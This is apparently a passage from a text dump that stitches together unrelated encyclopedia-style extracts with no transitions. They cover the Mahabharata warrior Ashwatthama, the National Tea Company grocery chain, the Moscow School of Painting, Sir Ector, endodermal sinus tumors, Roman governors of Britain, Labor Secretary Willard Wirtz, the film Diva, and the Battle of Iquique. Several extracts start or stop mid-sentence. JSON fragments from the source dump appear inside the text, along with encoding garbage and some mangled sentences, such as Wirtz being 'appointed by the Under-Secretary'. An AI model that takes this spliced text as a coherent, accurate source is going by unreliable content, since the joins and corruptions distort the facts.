60 were converted and used for tests in France from 2001 to 2005 on the LGV Nord line. However, no type approval was granted for the trains in France even after the tests, the trains never entered regular cross- border service.

Ashvatthama is a MaharathiK M Ganguly (1883‚Äì1896).

He became a Chiranjivi (immortal) due to a boon given to him by Lord Shiva]. The deceptive plot of his rumoured death led to the beheading of his grieving father Drona, who was incapacitated while meditating for his son's soul. Ashvatthama was appointed as the final commander-in-chief of the Kauravas in the Kurukshetra War. Overcome with grief and rage, he slaughters most of the Pandava camp in a single night offensive. Ashwatthama ruled the Northern Panchala being subordinate to the rulers of Hastinapura. He was one of the warriors of mahabharat war who crossed all limits of conduct and even misused divine Astras.  Etymology  According to The Mahabharata, Ashvatthama means \\"the sacred voice which relates to that of a horse\\".http://www.sacred- texts.com/hin/m07/m07193.htm It is so called because when he was born he cried like a horse.http://spokensanskrit.de/index.php?tinput=azvatthAma&direction;=SE&script;=HK&link;=yes&beginning;=  Birth and Life Prior to the War  Ashwatthama is the son of Dronacharya and Kripi. Drona does many years of severe penance to please Lord Shiva in order to obtain a son who possesses the same valiance as Lord Shiva. He is a Chiranjivi. Ashvatthama is born with a gem on his forehead which gives him power over all living beings lower than humans; it protects him from hunger, thirst, and fatigue. Though an expert in warfare, Dronacharya lives the simple life, with little money or property. As a result, Ashvatthama has a difficult childhood, with his family unable to even afford milk. Wanting to provide a better life for his family, Drona goes to the Panchal Kingdom to seek aid from his former classmate and friend, Drupada. However, Drupada rebukes the friendship, claiming a king and a beggar cannot be friends, humiliating Drona. After this incident, and seeing the plight of Drona, Kripacharya invites Drona to Hastinapur. There, he comes upon the attention of his co-disciple Bhishma. Thus, Dronacharya becomes the guru of both Pandavas and Kauravas in Hastinapur. Ashwatthama is trained in the art of warfare along with them.K M Ganguly(1883-1896). The Mahabharata,Book 5 Udyoga Parva,Section CLXVIII sacred-texts.com,October 2003,Retrieved 2013-11-14  Role in the Kurukshetra war  Since Hastinapura, ruled by King Dhritarashtra, offered Dronacharya the privilege of teaching the Kuru princes, both Dronacharya and Ashwatthama are loyal to Hastinapur and fight for the Kauravas in the Kurukshetra war. Before Dronacharya's death, Ashwatthama visits his father, desiring a blessing of victory that he is denied. Drona advises Ashwatthama to win the war using his own strength and not through a blessing. On the 14th day of the war, he kills a division of Rakshasas and Anjanaparvan (son of Ghatotkacha). He also stands against Arjuna several times, trying to prevent him from reaching Jayadratha, but is eventually defeated by Arjuna. = Death of Drona = Bhima kills an elephant named Asvatthama, folio from Razmnama On the 10th day of the war, after Bhishma falls, Drona is named the supreme commander of the armies. He promises Duryodhana that he will capture Yudhishthira, but then he repeatedly fails to do so. Duryodhana taunts and insults him, which greatly angers Ashwatthama, causing friction between Ashwatthama and Duryodhana. Krishna knows that it was not possible to defeat an armed Drona. So, Krishna suggests to Yudhishthira and the other Pandavas, if Drona were convinced that his son was killed on the battlefield, then his grief would leave him vulnerable to attack. Krishna hatches a plan for Bhima to kill an elephant by the name Ashwatthama while claiming to Drona it was Drona's son who was dead. Ultimately, the gambit works (though the details of it vary depending on the version of the Mahabharata), and Dhristadyumna beheads the grieving sage. = Narayanastra usage = After learning of the deceptive way his father was killed, Ashwatthama becomes filled with wrath and invokes the celestial weapon called the Narayanastra, against the Pandavas. When the weapon is invoked, violent winds begin to blow, peals of thunder are heard, and an arrow appears for every Pandava soldier. This puts fear into the Pandava army, but on Krishna instructions all the troops abandoned their chariots and also lay down all its weapons and surrender it to the weapon. As lord krishna himself being the incarnation of Narayana, he knows about the weapon, as the weapon only targets an armed person while ignores unarmed ones. After getting their soldiers to disarm (including Bhima with some difficulty), the astra passes by harmlessly. When urged by Duryodhana to use the weapon again, desirous of victory, Aswatthama sadly responds that if the weapon is used again, it will turn on its user. According to the Chaturdhar compilation, the Narayanastra destroys one Akshauhini of Pandava army completely. After the use of Narayanastra, a terrible war between both armies takes place. Ashvatthama defeats Dhrishtadyumna in direct combat, but failed to kill him as Satyaki and Bhima cover his retreat.K M Ganguly(1883-1896). The Mahabharatha Book 7: Drona page 478-479 Aswathama defeated Satyaki, Bhima, Drishtadyumna, October 2003, Retrieved 2015-01-13 As the battle continues, Ashwatthama manages to kill King Nila of Mahismati. = Becoming commander = After the terrible death of Dushasana, Ashwatthama suggests Duryodhana to make peace with the Pandavas, keeping in mind the welfare of Hastinapur. Later, after Duryodhana is struck down by Bhima and facing death, the last three survivors from the Kaurava side, Ashwatthama, Kripa, and Kritvarma rush to his side. Ashwatthama swears to bring Duryodhana revenge, and Duryodhana appoints him as the commander-in- chief. = Attack on Pandava Camp = Along with Kripa and Kritavarma, Ashwatthama plans to attack the Pandavas camp at night. Ashwatthama first kicks and awakens Dhrishtadyumna, the commander of the Pandava army and the killer of his father.K M Ganguly(1883-1896). The Mahabharata Book 10: Sauptika Parva section 8 Ashvatthama killing Dhrishtadyumna, October 2003, Retrieved 2015-04-17 Ashwatthama strangles the half-awake Dhrishtadyumna by choking him to death as the prince begs to be allowed to die with a sword in his hand. Ashwatthama proceeds with butchering the remaining warriors, including Shikhandi, Yudhamanyu, Uttamaujas, and many other prominent warriors of the Pandava army; many texts put an emphasis on his exploits against those from Panchal. He also kills Draupadi's children in their sleep. Even as some soldiers try and fight back, Ashwatthama remains unharmed due his activated abilities as one of the eleven Rudras. Those who try to flee from Ashwatthama's wrath are hacked down by Kripacharya and Kritavarma at the camp's entrances. After the slaughter, the three warriors go to find Duryodhana. After relaying to him the deaths of all the Panchalas, they announce that the Pandavas have no sons with whom to rejoice their victory. Duryodhana felt greatly satisfied and avenged at Ashwatthama's ability to do for him what Bhisma, Drona, and Karna could not. With this, Duryodhana breathes his last, and mourning, the three remaining members of the Kaurava army perform the cremation rites. Aftermath of the Attack Ashwathama was arrested and brought to Draupadi by Arjuna The Pandavas and Krishna who were away during night, now return to their camp the next day morning. Hearing the news of these events Yudhishthira faints and the Pandavas become inconsolable. Bhima angrily rushes to kill Drona's son. They find him at sage Vyasa's ashram near the bank of Bhagiratha. The now triggered Ashwatthama invokes the Brahmashira against the Pandavas to fulfill the oath of killing them. Krishna asks Arjuna to fire the Brahmashira, the anti-missile, against Ashvatthama to defend themselves. Vyasa intervene and prevent the weapons from clashing against each other. He asks both Arjuna and Ashwatthama to take their weapons back. Arjuna, knowing how to do so takes it back. Narada and Vyasa came to stop Brahmashirsha astras used by Ashvatthama and Arjuna respectively Ashwatthama not knowing how to take back the Brahmastra,instead directs the weapon towards the womb of the pregnant Uttara in an attempt to end the lineage of the Pandavas. The angered Pandavas try to kill Ashwatthama, but the Supreme lord Sri Krishna curses that for 3000 years ,he will suffer to the excessive amount but still he will not die, his skin will start to melt but still he will not die, nobody will come in front of him, Meanwhile, Supreme Lord Sri Krishna goes to the womb of Uttara and on the request of Draupadi and Subhadra saves her child from Brahmshirastra. As the child faced a test of life even before being born, Lord Sri Krishna names him Parikshit (Tested one)and later on succeeds Yudhisthira to become king of Hastinapur. Lineage A theory is propounded by historians R. Sathianathaier and D. C. Sircar, with endorsements by Hermann Kulke, Dietmar Rothermund and Burton Stein.: \\"...the rather well argued and plausible stand that the Palavas were indigenous to the central Tamil plain, Tondaimandalam...\\" Sircar points out that the family legends of the Pallavas speak of an ancestor descending from Ashwatthama and his union with a Naga princess. It was the son born from this union, that would have started this dynasty. This claim finds support in the fact that Kanchipuram was where the Pallavas would dwell, and this was earlier a part of the Naga Kingdom. And a further corroboration is that the gotra of the PƒÅlave Maratha family is Bharadwaja (grandfather of Ashwatthama), same as the one which Pallavas have attributed to themselves in their records.Vaidya C.V.,History of Medieval Hindu India, pg.281  References   External links  Original text online * GRETIL etext (Muneo Tokunaga) * MahƒÅbhƒÅrata online * History: Encounters with Ashvatthama Chiranjivins Characters in the Mahabharata ","title":"Ashwatthama"},{"id":"30874109","text":"The National Tea Company (NATCO, informally known as National) was a Midwestern United States grocery chain that operated during the 20th century. Founding Founded in 1899 by Danish immigrant George S. Rasmussen along with his brother Thorvald in Chicago, Illinois, the retailer spread to about 160 stores by 1920, and annual sales approached $13 million. By the end of the '20s, National Tea had over 600 locations in the Chicago area alone and another 1,000 stores nationwide. Sales grew to about $90 million a year. Many of these stores were closed or sold during the Great Depression, but National Tea remained among the 10 largest grocery chains in the United States for most of the 20th century. Sale to George Weston and Expansion In 1955, when annual sales topped $600 million and the company had nearly 20,000 employees nationwide, National Tea was purchased by George Weston Ltd., a large Canadian grocery retailer, later renamed Loblaw Companies. Most National stores were in the Mississippi Valley, including in Louisiana. During the 1950s, it acquired about 500 new stores by buying up smaller chains. Eventually, National, renamed National Supermarkets, was pared down to operations in Missouri, Illinois, Indiana, Minnesota and Louisiana. It was a major chain in the St. Louis, Indianapolis and New Orleans areas until Loblaw sold it off to The Great Atlantic & Pacific Tea Company, better known as A&P;, in 1976. Sale to Schnucks and Decline Schnucks Markets acquired National Tea in 1995. Immediately after that, per the FTC, Schnucks sold the National New Orleans division to Schwegmann Giant Super Markets of Metairie, Louisiana, which later sold them to A&P;, which finally sold them to Rouse Markets in 2007. National itself had cemented the number two spot in St. Louis by acquiring several former Kroger locations and the Kroger distribution center in the market when the latter exited St. Louis in 1986. Kroger and National had been battling for the number two and three spots in the St. Louis market since the 1970s, swapping rankings several times over throughout the 1970s and 1980s.

Tiled artwork on the building. The Moscow School of Painting, Sculpture and Architecture () was one of the largest educational institutions in Russia. The school was formed by the 1865 merger of a private art college, established in Moscow in 1832, and the Palace School of Architecture, established in 1749 by Dmitry Ukhtomsky. By the end of the 19th century, it vied with the state-run St. Petersburg Academy of Arts for the title of the largest art school in the country. In the 20th century, art and architecture separated again, into the Surikov Art Institute in Moscow (–ú–æ—Å–∫–æ–≤—Å–∫–∏–π –•—É–¥–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–π –ò–Ω—Å—Ç–∏—Ç—É—Ç –∏–º–µ–Ω–∏ –°—É—Ä–∏–∫–æ–≤–∞) and the Moscow Architectural Institute (–ú–æ—Å–∫–æ–≤—Å–∫–∏–π –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–Ω—ã–π –ò–Ω—Å—Ç–∏—Ç—É—Ç); the latter occupies the historical School buildings in Rozhdestvenka Street. History The Palace School of Architecture goes back to the classes of Dmitry Ukhtomsky that operated in 1749‚Äì1764. Twenty years, the classes were reinstated by Matvey Kazakov, and in 1804 acquired the title of Kremlin College, later Palace School of Architecture. Graduates were awarded the title of Architect's Assistant and had to earn their own licenses through later work. The private art college was established in 1832 by Egor Makovsky and A.S. Yastrebilov as Classes of Nature, and renamed Art Classes in 1833. In 1843, the classes were incorporated as the School of Painting and Sculpture of the Moscow Art Society. In 1865, the Palace School was incorporated into School of Painting and Sculpture; next year, the expanded institution was renamed Moscow School of Painting, Sculpture and Architecture. The School was unique in Imperial Russia, being a private college in a country were education was primarily state-managed. Its diplomas (excluding the few highest-ranking graduates) were ranked inferior to those of the Academy of Arts; probably unimportant in fine arts, this division was a serious burden for graduates in architecture. The School tried to close the gap through acquiring a state charter in 1896, but failed. After the October Revolution of 1917, the school was transformed in 1918 into the Second Free State Art Workshop (Svomas). Art workshops eventually disintegrated. In 1939, Igor Grabar launched the new college of fine arts, which acquired the name of Surikov Institute in 1948. Architectural education initially concentrated around VKhUTEMAS and MVTU and was organized into the Moscow Architectural Institute in 1933. Arts More democratic in comparison with the St. Petersburg Academy of Arts, the school played an important role in developing Russian national realistic art in the second half of the 19th century and the beginning of the 20th century. Admissions were based primarily on artistic merits, allowing students without formal high school diplomas. For example, Konstantin Melnikov joined the School at the age of 15, having only two years of primary education; his class of 11 was chosen from 270 applicants. Melnikov completed a diploma in Arts after nine years of training (1905‚Äì1914) and a diploma in Architecture three years later (Khan- Magomedov). One of the leader instructors of sculpture was Sergei Volnukhin. Notable alumni of the school include L√©opold Survage, Igor Babailov, Vasily Perov, Alexei Savrasov, Illarion Pryanishnikov, Vladimir Makovsky, Isaac Levitan, Alexei Stepanov, Sergei and Konstantin Korovin, Abram Arkhipov, Mikhail Nesterov, Anna Golubkina, Sergey Konenkov, Boris Korolev, Feodor Rojankovsky, Aleksey Korin and Alexandru PlƒÉmƒÉdealƒÉ. Architecture A study of 100 architects working in Moscow between the 1890s and 1910s by Maria Naschokina shows that more than half of them graduated from the School. The fact that most School graduates lacked a full state diploma was a major drawback in state employment, but irrelevant for the private clients that dominated construction market in Moscow (Naschokina, p. 43). Thus, architectural profession in Moscow and Saint Petersburg were clearly divided between graduates of the Moscow School and the Saint Petersburg schools (Imperial Academy of Arts and Institute of Civil Engineers). The students had to demonstrate professional achievement during their education and were rated according to their graduate assignment. The best, earning a Large Silver medal, were rewarded with an official title of an Architect, sufficient for private order and state employment. The next tier, with a Small Silver medal, received a construction management license, sufficient for taking private orders but not state jobs. The rest did not qualify and had to return with new graduate projects (Naschokina, pp. 44‚Äì45). As an alternative, they could apply to the Imperial Academy and complete the courses at Saint Petersburg; the Academy awarded construction management licenses to all graduates. There were few moves in the opposite direction (Ivan Fomin was expelled from the Academy and completed his license exams in Moscow). Some, like Vyacheslav Oltarzhevsky or Ilya Bondarenko, completed training overseas. Fyodor Schechtel was expelled from the School in 1878 and acquired the license only in 1894. These difficulties extended architectural training, from admission to professional license, to 10‚Äì15 years and even more; graduates were typically mature men in their thirties, with a decade of practical experience. There were, however, rare exceptions like Ivan Mashkov, who earned a license at the age of 19 and completed his first projects at the age of 23 (Naschokina, p. 330-335).

(1903) Sir Ector , sometimes Hector, Antor, or Ectorius, is the father of Sir Kay and the adoptive father of King Arthur in the Matter of Britain. Sometimes portrayed as a king instead of merely a lord, he has an estate in the country as well as properties in London. Ector appears in the works of Robert de Boron and the Lancelot-Grail, as well as later adaptations such as the Post-Vulgate Cycle and Thomas Malory's Le Morte d'Arthur. In these versions, Merlin takes Arthur from his biological parents King Uther Pendragon and Igraine, and brings him to Ector's estate. Merlin does not reveal the boy's true identity, and Ector takes him on and raises him with Kay as his own son. When Kay is old enough to be knighted, Ector's young ward serves as his squire. In The Once and Future King T. H. White says his lands lie in the \\"Forest Sauvage\\"; some later writers have used this as well. In the earlier Welsh stories, the father of Kay (Cei) is instead named Cynyr (Kyner).Celtic Kingdoms of the British Isles. In other mediaIn the 1963 Walt Disney Studios animated musical-fantasy-comedy movie The Sword in the Stone, Lord Ector is voiced by actor Sebastian Cabot. He does not believe in magic until Merlin casts a blizzard before him, thus allowing the wizard to educate Arthur in the castle, even though Ector has forbidden it. He is extremely distrustful of magic and Merlin, whom he mistakenly refers to as Marvin. When he first allows Merlin to educate Arthur, Ector forces Merlin to reside in an old, dilapidated tower near the castle, in hopes of making Merlin want to leave. Even though he loves him, Ector often treats Arthur harshly and possesses a clear authority over him, treating him more as a servant, while doting on his birth son, Sir Kay. However, he does care for Arthur, as shown in his first scene, where he scolds Kay for allowing Arthur to go into the forest alone and worried that he might be dead. He also appoints him as Kay's squire, and clearly has affection for Arthur, and does not always want to treat him poorly, but rather feels responsible for his welfare. After Arthur is revealed as the rightful King of England by pulling the sword from the stone, he immediately begs Arthur's forgiveness for how he has treated him up to that point and bows in submission while sternly ordering Kay to also bow down to Arthur. *In the 1975 Monty Python film Monty Python and the Holy Grail Sir Ector is named as one of the knights killed by the Rabbit of Caerbannog. *In the 1981 epic fantasy film Excalibur, Sir Ector is portrayed by actor Clive Swift. *In the 2011 historical-fantasy-drama TV series Camelot Sir Ector is portrayed by actor Sean Pertwee. *In Cursed (2020 TV series), Peter Guinness (actor) is the actor who plays Sir Ector.

It is the most common testicular tumor in children under 3, and is also known as infantile embryonal carcinoma. This age group has a very good prognosis. In contrast to the pure form typical of infants, adult endodermal sinus tumors are often found in combination with other kinds of germ cell tumor, particularly teratoma and embryonal carcinoma. While pure teratoma is usually benign, endodermal sinus tumor is malignant. Cause Causes are poorly understood. Diagnosis The histology of EST is variable, but usually includes malignant endodermal cells. These cells secrete alpha-fetoprotein (AFP), which can be detected in tumor tissue, serum, cerebrospinal fluid, urine and, in the rare case of fetal EST, in amniotic fluid. When there is incongruence between biopsy and AFP test results for EST, the result indicating presence of EST dictates treatment. This is because EST often occurs as small \\"malignant foci\\" within a larger tumor, usually teratoma, and biopsy is a sampling method; biopsy of the tumor may reveal only teratoma, whereas elevated AFP reveals that EST is also present. GATA-4, a transcription factor, also may be useful in the diagnosis of EST. Diagnosis of EST in pregnant women and in infants is complicated by the extremely high levels of AFP in those two groups. Tumor surveillance by monitoring AFP requires accurate correction for gestational age in pregnant women, and age in infants. In pregnant women, this can be achieved simply by testing maternal serum AFP rather than tumor marker AFP. In infants, the tumor marker test is used, but must be interpreted using a reference table or graph of normal AFP in infants. =Pathology= EST can have a multitude of morphologic patterns including: reticular, endodermal sinus-like, microcystic, papillary, solid, glandular, alveolar, polyvesicular vitelline, enteric and hepatoid. Schiller-Duval bodies on histology are pathognomonic and seen in the context of the endodermal sinus-like pattern. Rarely, it can be found in the vagina. Treatment Most treatments involve some combination of surgery and chemotherapy. Treatment with cisplatin, etoposide, and bleomycin has been described. Before modern chemotherapy, this type of neoplasm was highly lethal, but the prognosis has significantly improved since then. When endodermal sinus tumors are treated promptly with surgery and chemotherapy, fatal outcomes are exceedingly rare.

As the unified province \\"Britannia\\", Roman Britain was a consular province, meaning that its governors had to first serve as a consul in Rome before they could govern it. While this rank could be obtained either as a suffect or ordinarius, a number of governors were consules ordinarii, and also appear in the List of Early Imperial Roman Consuls. After Roman Britain was divided, first into two (early 3rd century), then into four (293), later governors could be of the lower, equestrian rank. Not all the governors are recorded by Roman historians and many listed here are derived from epigraphic evidence or from sources such as the Vindolanda letters. Beyond the recall of Gnaeus Julius Agricola in 85 the dates of service of those who can be named can only be inferred. Others are still entirely anonymous and by the time of the division of Britain into separate provinces, the record is very patchy.

Rutledge. Wirtz was a professor of law at Northwestern University from 1939 to 1942. He served with the War Labor Board from 1943 to 1945, and was chairman of the National Wage Stabilization Board in 1946. Wirtz returned to teach law at Northwestern until 1954. His students included future U.S. Supreme Court justice John Paul Stevens, whom Wirtz recommended for what became his 1947-48 clerkship with Justice Rutledge. He was active in Democratic politics and wrote speeches for Adlai Stevenson during his 1952 Presidential campaign. Wirtz was appointed by the Under- Secretary of Labor in 1961. The official portrait of W. Willard Wirtz hangs in the Department of Labor He held the post of Labor Secretary throughout the Kennedy and Johnson administrations, during which time he is credited for having dealt effectively with the various trade union strikes of the 1960s. One of his programs, meant to deal with a shortage of farmworkers after the end Bracero program in 1964 and a shortage of summer jobs for teenagers, was meant to replace the migrant workers with 17-year-old high school students. More than 18,000 were recruited for the A-TEAM, or Athletes in Temporary Employment as Agricultural Manpower, but only 3,300 ever worked in the fields, and many of them quickly quit or staged strikes because of the poor working conditions, including oppressive heat and decrepit housing. The program was cancelled after the first summer. While serving in the Labor Department, Wirtz developed programs for the Johnson administration's War on Poverty. He advocated for remedial education for school dropouts and for retraining programs for unemployed workers. Wirtz's relationship with Johnson was compromised by Wirtz sending a private memorandum to the President expressing concerns about the United States' involvement in the Vietnam War. Later life Following his public service, he practiced law in Washington, D.C. as a partner in Wirtz & Gentry (1970-78), Wirtz & Lapointe (1979-[?]), and Friedman & Wirtz (1984-1989).

It is one of the early French films to let go of the realist mood of 1970s French cinema and return to a colourful, melodic style, later described as cin√©ma du look. The film made a successful debut in France in 1981 with 2,281,569 admissions, and had success in the U.S. the next year, grossing $2,678,103. The film became a cult classic and was internationally acclaimed. Plot A young Parisian postman, Jules, is obsessed with opera, and particularly with Cynthia Hawkins, a beautiful and celebrated American soprano who has never allowed her singing to be recorded. Jules attends a recital at the Th√©√¢tre des Bouffes du Nord in Paris, where Hawkins sings the aria \\"Ebben? Ne andr√≤ lontana\\" from the opera La Wally. He illicitly makes a high-quality bootleg recording of her performance using a Nagra professional tape-recorder. Afterwards, he steals the gown she was wearing from her dressing room. Later, Jules accidentally comes into possession of an audio cassette with the recorded testimony of a prostitute, Nadia, which exposes a senior police officer, Commissaire divisionnaire Jean Saporta, as being the boss of a drug trafficking and prostitution racket. Nadia drops the cassette in the bag of the postman's moped moments before she is killed by Saporta's two henchmen - L' Antillais and Le Cur√© (\\"The West Indian\\" and \\"The Priest\\"). Two police officers are now after Jules, seeking Nadia's cassette, although they only know that it incriminates a prominent gangster and not that the gangster is actually their superior. Jules is also being hunted by Saporta's two murderous henchmen. A third party seeking him are two Taiwanese men, who are after his unique and valuable recording of Cynthia Hawkins. Jules seeks refuge from all these pursuers with his new friends, the mysterious bohemian Serge Gorodish and his young Vietnamese-French muse, Alba. Feeling guilty, Jules returns Cynthia Hawkins' dress. She is initially angry, but eventually forgives him. Cynthia is intrigued by the young Jules' adoration and a kind of romantic relationship develops, expressed by the background of the piano instrumental, Promenade Sentimentale by Vladimir Cosma, as they walk around Paris in the Jardin des Tuileries early one morning. The Taiwanese try to blackmail Cynthia into signing a recording contract with them. Although they don't yet possess Jules' recording of her performance, they claim they do and threaten to release it as a pirate record if she doesn't cooperate; she indignantly refuses. The Phare de Gatteville, a lighthouse on the Normandy coast, was the filming location for the safehouse Jules was taken to by Gorodish and Alba Jules is spotted and chased by the two police officers, but he escapes by riding his moped through the Paris M√©tro system. He takes refuge in the apartment of a prostitute he knows, but flees when he realizes she is part of Saporta's criminal network - he leaves just before L' Antillais and Le Cur√© arrive. The enforcers chase him on foot and Jules is shot and wounded, but Gorodish rescues Jules just before Le Cur√© can kill him. Gorodish and Alba drive Jules to a safe house outside Paris, a remote lighthouse, in Gorodish's antique Citro√´n Traction Avant. Gorodish plans an elaborate scheme. Now in possession of the recording that incriminates Saporta, Gorodish uses it to blackmail him. Commissaire Saporta pays off Gorodish, but places a remote control bomb under his car. The Taiwanese blackmailers are also pursuing Gorodish and immediately steal the tape and his car. Saporta sets off the explosion, inadvertently killing the two Taiwanese, but not Gorodish. Gorodish drives away in a second Traction Avant that he had hidden in advance. Later, Jules returns to Paris to give Cynthia his bootleg recording and lift the threat of blackmail from her. But he is abducted from outside her hotel by L'Antillais and Le Cur√© who were lying in wait for him; they take him to his loft apartment with the intention of killing him there. Police officer Paula, who has been keeping Jules' apartment under surveillance, saves him by killing Le Cur√© and wounding L'Antillais. Saporta then appears, kills his surviving henchman, and attempts to kill Jules and Paula, intending to make it look like his dead henchman shot them. Once again Gorodish saves the day by turning out the lights and making Saporta fall down an elevator shaft in the dark. In the film's final scene, Jules plays his tape of Cynthia's performance for her and she expresses her nervousness over hearing it because she \\"never heard [herself] sing.\\" Cast Fr√©d√©ric Andr√©i as Jules * Wilhelmenia Wiggins Fernandez as Cynthia Hawkins * Roland Bertin as Weinstadt * Richard Bohringer as Gorodish * G√©rard Darmon as L'Antillais * as Nadia * Jacques Fabbri as Jean Saporta * as Zatopek * Thuy An Luu as Alba * as Mermoz * Laure Duthilleul as Mermoz's friend * Dominique Pinon as The Monk * Dominique Besnehard as record store employee * Isabelle Mergault as game girl Soundtrack Highlights of the soundtrack include the aria Ebben?

The War of the Pacific was a conflict that pitted Chile against Peru and Bolivia. The battle took place off the then-Peruvian port of Iquique. The Peruvian ironclad , commanded by Miguel Grau Seminario, sank the , a Chilean wooden corvette captained by Arturo Prat Chac√≥n, after four hours of combat. Background The Bolivian government had threatened to confiscate and to sell the Antofagasta Nitrate & Railway Company, a mining enterprise with Chilean and British investors, by a decree on 1 February 1879. In response, the Chilean government sent a small military force which disembarked and seized control of the port of Antofagasta on 14 February. This event made Bolivian President Hilari√≥n Daza declare war on Chile, and also forced Peru to honor a secret 1873 treaty with Bolivia. Although Peru tried to negotiate and to stop the imminent conflict, Chile, knowing of this pact, declared war on both Peru and Bolivia on 5 April. Another small Chilean force took control of the city of Calama after its victory in the Battle of Topater on March 23. From the beginning of the conflict, both sides clearly knew that control of the sea was the key to obtaining victory. Whichever country controlled the sea could freely transport troops and land them at any strategic point. So, during the first year of the war, Chilean strategy focused on destroying the Peruvian Navy. In order to achieve this goal, the Chilean naval commander, Juan Williams Rebolledo, planned to sail north with his entire fleet, trying to engage the Peruvian Navy at Callao and achieve domination of the sea once and for all. The main ships of the Chilean Navy were sent towards the Peruvian port of Callao. Two old, wooden ships, the corvette and the schooner Covadonga, commanded by Captains Arturo Prat and Carlos Condell respectively, were left blockading the Peruvian port of Iquique. However, as the Chilean Navy steamed north towards Callao, two ironclad ships of the Peruvian Navy steamed south from Callao, unseen. These ships were the monitor and the armored frigate , commanded by Rear Admiral Miguel Grau (then a Captain), the commanding officer of the Peruvian Navy, and Captain Juan Guillermo More. The wooden corvette Esmeralda was constructed in 1854 in Henry Pitcher's shipyard, arriving in Valpara√≠so in 1856. This vessel was named Esmeralda after the frigate of the same name captured by Lord Cochrane at El Callao in 1820. Esmeralda displaced 854 tons, and was armed with twenty 32-pound cannons and two 12-pound cannons. In 1868, this was replaced with twelve 40-pound rifled cannons and four 40-pound Whitworth cannons. The Peruvian ironclad Hu√°scar was built in 1865 in the Laird Brothers' shipyard in Birkenhead, England. Hu√°scar displaced 1,180 tons and was armed with two cannons of , two cannons of , one cannon of , and one Gatling machine gun. This ship could reach a speed of . Prelude Commander Arturo Prat Chac√≥n Commander Miguel Grau Seminario. It was 21 May 1879, 6:30 in the morning, and the harbor was obscured by a thick marine fog. When the fog began to clear, Covadongas lookout shouted: \\"Smoke to the north!\\" but the crew was not able to identify the newly arrived ships. After a few moments, they concluded that it was the Peruvian squadron coming back. At 6:45 a.m., a sailor by Condell's side asked for the telescope, and in a moment of clarity, he observed the warships' rigging and said to Condell: \\"It's the Hu√°scar and the Independencia.\\" \\"What basis do you have to assert that?\\" asked Condell, and the sailor answered \\"From the shape of the platform on top of the foremast.\\" Immediately Condell ordered a shot to be fired in the air to warn Esmeralda, still anchored in the port. The ships were indeed Independencia and Hu√°scar. In that same moment, the Peruvian admiral Grau roused his crew: > \\"Crewmembers and Sailors of the Hu√°scar, Iquique is in sight, there are our > afflicted fellow countrymen from Tarapac√°, and also the enemy, still > unpunished.

No matter what the > outcome, Peru will not fall. For our fatherland, Long Live Peru!\\" Carlos Condell de la Haza warned Prat, and Commander Arturo Prat, seeing the difference between their forces and the enemies', ordered to hoist the signal: \\"reinforce the charge,\\" \\"come to the talks,\\" and \\"follow my waters\\" (follow his course) and then inspired the crew with the following words: > Lads, the struggle will be against the odds, but cheer up, and have courage. > Never has our flag been hauled down in the face of the enemy, and I hope, > thus, this will not be the occasion to do so. For my part, as long as I > live, this flag will fly in its place, and if I should die, my officers > shall know how to fulfill their duties. Long Live Chile! After the speech, Covadonga came to a halt, and Commander Prat then told the crews of Esmeralda and Covadonga led by Commander Condell: \\"For lunch people, strengthening loads, each to his duty!\\" Condell simply replied, \\"All right, sir!\\" A young ordering bugler at the same time was sounding the call to stations, and the Chilean crew then took their positions. After this everyone felt an explosion and a plume of water and foam up on the two ships; Hu√°scar had fired its first shot. The battle had begun. On land, people awoke to the first shot of Covadongas gun and went to the beach to get a first-hand look at the vessels coming to lift the blockade of the city.  Battle  On the other hand, the text is exactly the same in the biographical article on Arturo Prat and does not have this comment at that point At 8:15, the first volley hit between the ships, and Prat ordered Esmeralda to start moving, followed by Covadonga. The transport Lamar was ordered (by Prat) to retreat to the south. At 8:25, a second volley fell and a shot from Hu√°scar hit fully on the starboard (right) side, passed through Esmeraldas side, killing the surgeon Videla, beheading his assistant, and mortally wounding another sailor. Condell changed his course and went behind Lamar. Grau ordered Independencia to block Covadonga and Lamars way. Prat observed Condell's action and asked himself: \\"What is Condell doing?\\" Condell ignored Prat's order and followed Lamar, but the warship did get away from Covadonga, and Independencia, under control of Juan Guillermo More, followed him. Independencia pursued Covadonga, while Hu√°scar finished Esmeralda. Prat quickly positioned the ship in front of the coast, from it, forcing Hu√°scar to shoot with a parabolic trajectory to avoid hitting the Peruvian village, whose people gathered in crowds to see the battle. General Buend√≠a, commander of the Peruvian garrison of Iquique, had artillery placed on the beach and sent an emissary in a fast rowing boat with a warning to Hu√°scar that Esmeralda was loaded with torpedoes. Grau stopped from her and began shooting with the 300-pound cannons, not hitting her for an hour and a half, owing to the Peruvian sailors' inexperience in the handling of the monitor's Coles turret. The Chilean crew answered with their 30-pound cannons and gunfire, shots that rebounded uselessly on Hu√°scars plated armour. On the coast, the Peruvian Army garrison in the town installed a cannon battery manned by gunners and bombardiers, and began to attack the Chilean ship. A grenade reached her, killing three men. Prat order the warship to move, overexerting the engine and causing one of the boilers to explode. The ship's speed dropped to (her engine was defective due to age and lack of maintenance). This move allowed Grau to see the absence of the torpedoes that supposedly filled Esmeralda. One of Hu√°scars shots hit directly on board, beheading the ordering bugler and mutilating the gun crews. The battle dragged on. The sailors from Huascar were very hard put to try and hit the Chilean corvette, seeing as, from Huascars point of view, their own countrymen and the Peruvian port were behind Esmeralda. Any missed cannon shot would very probably land among the population or batteries of the Peruvian port. Grau, seeing how useless it was to try to win the battle by exchange of cannon fire, and wanting to end the combat, ordered his ship to ram Esmeralda. Prat tried to avoid the blow by giving the rod forward and closing a port and managed to sidestep the blow to the mizzen mast height without further damage. When the ships collided, Hu√°scar was finally able to fire their 10-inch (300-pound) cannons at close range, causing the deaths of 40 or 50 sailors and marines. Several sources point out that Prat's body was afterwards found on Huascars deck. Chileans argue that Prat, in a heroic gesture, tried to abandon his badly damaged ship and take over the enemy one. He would have shouted \\"Let's board, boys!\\" and jumped over the Peruvian ship, but without being followed by more than one countryman due to the noise of the combat. Then he would have been shot to death, while the one who boarded with him, Petty Officer Juan de Dios Aldea, would have been wounded. After the first ram, Esmeraldas situation was downright desperate. Grau wanted to give his opponents time to surrender. In Esmeralda Lieutenant Luis Uribe Orrego, by now the ship's acting Captain, then called an official meeting and decided not to surrender to the Peruvian Navy. While this was happening a sailor climbed the mizzen-mast to nail down the Chilean national flag, in order that the crew remember what Prat had said before the battle. Grau was soon notified that the truce did not work again and decided to again ram Esmeralda, rushing at full speed on it, now for the starboard side. Uribe tried to maneuver like Prat and 